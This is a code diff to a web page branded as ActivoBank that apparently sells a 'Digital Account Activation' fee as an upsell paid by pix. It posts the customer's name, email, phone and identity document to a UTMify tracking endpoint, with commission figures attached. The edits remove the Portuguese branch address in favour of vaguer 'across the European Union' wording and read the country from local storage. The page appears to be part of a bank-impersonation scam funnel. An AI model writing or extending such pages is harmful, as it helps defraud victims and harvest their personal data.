@@ -147,7 +147,7 @@ window.apiUrl = window.apiUrl || function (p) {
     </div>
 
     <!-- Description -->
-    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell2.t05">Your ActivoBank Digital Account includes all the features you need to manage your money in Portugal and across Europe.</span></p>
+    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell2.t05">Your ActivoBank Digital Account includes all the features you need to manage your money across Europe.</span></p>
 
     <!-- Digital Account sub-card -->
     <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:16px;padding:20px 20px 14px;margin-bottom:24px;text-align:left;">
@@ -197,7 +197,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <div class="logo-wrap">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
     </div>
-    ActivoBank<br/>Branch in Portugal – Lisbon – 1050-001
+    ActivoBank<br/>Operating across the European Union
   </div>
 
 </div>
@@ -261,7 +261,7 @@ async function sendUtmify(status,orderId,createdAt,approvedDate){
   try{
     await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json',},
       body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'pix',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
-        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
+        customer:{name:nome,email,phone:phone||null,document:doc,country:(localStorage.getItem('phoneCountryIso')||'PT')},
         products:[{id:'ativacao-conta',name:'Digital Account Activation — ActivoBank Credit',planId:null,planName:'upsell 2',quantity:1,priceInCents:cents}],
         trackingParameters:getUtmParams(),
         commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
